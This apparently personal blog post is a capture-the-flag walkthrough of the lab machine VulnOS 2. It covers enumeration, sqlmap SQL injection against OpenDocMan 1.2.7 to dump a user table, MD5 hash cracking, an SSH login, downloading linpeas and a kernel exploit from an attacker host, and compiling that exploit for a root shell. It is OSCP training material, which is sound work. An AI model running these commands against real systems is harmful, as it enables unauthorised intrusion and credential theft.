<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=Content-Language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="VulnOS 2 a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
After uncovering the IP address, I ran threader3000 and let it run its suggested nmap scan."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="VulnOS 2"><meta name=twitter:description content="VulnOS 2 a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
After uncovering the IP address, I ran threader3000 and let it run its suggested nmap scan."><meta property="og:title" content="VulnOS 2"><meta property="og:description" content="VulnOS 2 a vulnerable machine found on the NetSecFocus Trophy Room list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.
First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used netdiscover -i eth0 until I came across the IP of this machine.
After uncovering the IP address, I ran threader3000 and let it run its suggested nmap scan."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-08-16-vulnos/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-08-16T00:00:00+00:00"><meta property="article:modified_time" content="2020-08-16T00:00:00+00:00"><title>VulnOS 2 · Kiel Vaughn, CISSP
</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-08-16-vulnos/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.216fdd344aee259067eaade5e8108697c18f6d1e6d5d9ec7e1269f4cf0d39d56.css integrity="sha256-IW/dNEruJZBn6q3l6BCGl8GPbR5tXZ7H4SafTPDTnVY=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-light"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-08-16-vulnos/>VulnOS 2</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-08-16T00:00:00Z>August 16, 2020
</time></span><span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
3-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/oscp/>OSCP</a>
</span><span class=separator>•</span>
<span class=tag><a href=/tags/sqlmap/>sqlmap</a>
</span><span class=separator>•</span>
<span class=tag><a href=/tags/website-enumeration/>website enumeration</a>
</span><span class=separator>•</span>
<span class=tag><a href=/tags/privilege-escalation/>privilege escalation</a></span></div></div></header><div><p><a href=https://www.vulnhub.com/entry/vulnos-2,147/>VulnOS 2</a> a vulnerable machine found on the <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0">NetSecFocus Trophy Room</a> list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.</p><p>First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used <strong>netdiscover -i eth0</strong> until I came across the IP of this machine.</p><p><img src=/assets/img/VulnOS1.png alt="VulnOS 2 netdiscover"></p><p>After uncovering the IP address, I ran <strong>threader3000</strong> and let it run its suggested nmap scan.</p><p><img src=/assets/img/VulnOS2.png alt="VulnOS 2 threader 3000 nmap"></p><p>It appears that SSH, Apache, and IRC are open on this server. Let&rsquo;s take a look at the website.</p><p><img src=/assets/img/VulnOS3.png alt="VulnOS 2 website"></p><p>Let&rsquo;s follow the link on the site and it will pull up the website shown below.</p><p><img src=/assets/img/VulnOS4.png alt="VulnOS 2 JABC website"></p><p>Next, I ran <strong>gobuster dir -u http://[machine ip]/jabc/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.php -t 50</strong> to enumerate the website.</p><p><img src=/assets/img/VulnOS5.png alt="VulnOS 2 gobuster"></p><p><img src=/assets/img/VulnOS6.png alt="VulnOS 2 robots.txt"></p><p>Next, I looked at the <strong>robots.txt</strong> file, which has a wide number of disallowed entries (that turn out to be rabbit holes). After looking through this, I turned to the main Documentation page, which appeared blank, but upon selecting it all, it shows a directory (<strong>/jabcd0cs/</strong>) that we can navigate to and provides user credentials of <strong>guest/guest</strong>.</p><p><img src=/assets/img/VulnOS7.png alt="VulnOS2 Documentation webpage"></p><p>This brings up a site for a web application named OpenDocMan which is running version 1.2.7.</p><p><img src=/assets/img/VulnOS8.png alt="VulnOS 2 OpenDocMan 1.2.7"></p><p>I logged in with the credentials provided (<strong>guest/guest</strong>). I reviewed the files shown below but nothing of interest came out of them.</p><p><img src=/assets/img/VulnOS9.png alt="VulnOS 2 OpenDocMan guest login"></p><p>At this point, I decided to look for exploits, I used <strong>searchsploit OpenDocMan 1.2.7</strong> from my attacker PC which returned a result.</p><p><img src=/assets/img/VulnOS10.png alt="VulnOS 2 searchsploit"></p><p>Upon reviewing the text file (with <strong>searchsploit -x 32075</strong>), it appears that OpenDocMan has a SQL injection vulnerability. I ran <em><em>sqlmap &ndash;url &ldquo;http://[machine ip]/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odmuser</em>&rdquo; &ndash;dbs &ndash;level 5 &ndash;risk3</em>* to enumerate the databases with sqlmap.</p><p><img src=/assets/img/VulnOS11.png alt="VulnOS 2 sqlmap 1"></p><p>Next, I decided to enumerate the tables on the <strong>jabcd0cs</strong> table. I did this with sqlmap with <em><em>sqlmap &ndash;url &ldquo;http://[machine ip]/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odmuser</em>&rdquo; -D jabcd0cs &ndash;tables &ndash;level 5 &ndash;risk3</em>*.</p><p><img src=/assets/img/VulnOS12.png alt="VulnOS 2 sqlmap 2"></p><p>A few potential tables of interest came up. I decided to look at the <strong>odm_user</strong> table with <em><em>sqlmap &ndash;url &ldquo;http://[machine ip]/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odmuser</em>&rdquo; -D jabcd0cs -T odm_user &ndash;dump &ndash;level 5 &ndash;risk3</em>*, which dumped its contents. It uncovered a password hash as indicated below.</p><p><img src=/assets/img/VulnOS13.png alt="VulnOS 2 sqlmap 3"></p><p>A quick Google search mentioned that this is likely an MD5 hash. I went to <a href=https://www.md5-online.org/md5-decrypt.html>md5online.org</a> to decrypt this hash. This returned a value of <strong>webmin1980</strong> for the password.</p><p><img src=/assets/img/VulnOS14.png alt="VulnOS 2 crack hash"></p><p>I then tried to SSH in as the webmin user (uncovered in the sqlmap query above) and with the password of webmin1980. I was successful with connecting via SSH.</p><p><img src=/assets/img/VulnOS15.png alt="VulnOS 2 ssh webmin"></p><p>I decided to enumerate this server, in order to do so, I needed to serve up an HTTP server from my attacker pc with <strong>python3 -m http.server</strong>.</p><p><img src=/assets/img/VulnOS16.png alt="VulnOS2 python3 http server"></p><p>Next, from the initial foothold, I ran <strong>cd /tmp</strong> to go to the temporary directory, <strong>wget http://[attacker ip]:8000/linpeas.sh</strong> and finally <strong>chmod +x linpeas.sh</strong> to make this script executable.</p><p><img src=/assets/img/VulnOS17.png alt="VulnOS 2 wget chmod"></p><p>I next ran <strong>./linpeas.sh</strong> and it returns that the Linux version is likely exploitable and can be utilized for privilege escalation.</p><p><img src=/assets/img/VulnOS18.png alt="VulnOS 2 linpeas results"></p><p>Running <strong>searchsploit 3.13.0</strong> from our attacker PC returns a couple of results. The first one is a program that can be compiled. Let&rsquo;s copy it to our current directory on our attacker PC with <strong>searchsploit -m 37292</strong>.</p><p><img src=/assets/img/VulnOS19.png alt="VulnOS 2 searchsploit 37292"></p><p>Next, from our victim pc, let&rsquo;s run <strong>wget http://[attacker ip]:8000/37292.c</strong> followed by <strong>gcc -o 37292 37292.c</strong> to compile the program.</p><p><img src=/assets/img/VulnOS20.png alt="VulnOS 2 wget gcc"></p><p>After compiling the program, I ran <strong>./37292</strong> which gave us a root shell. I then ran <strong>cd /root</strong> followed by <strong>ls</strong> to list the directory contents followed by <strong>cat flag.txt</strong> to get the flag for this box.</p><p><img src=/assets/img/VulnOS21.png alt="VulnOS 2 run exploit root shell"></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2023
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>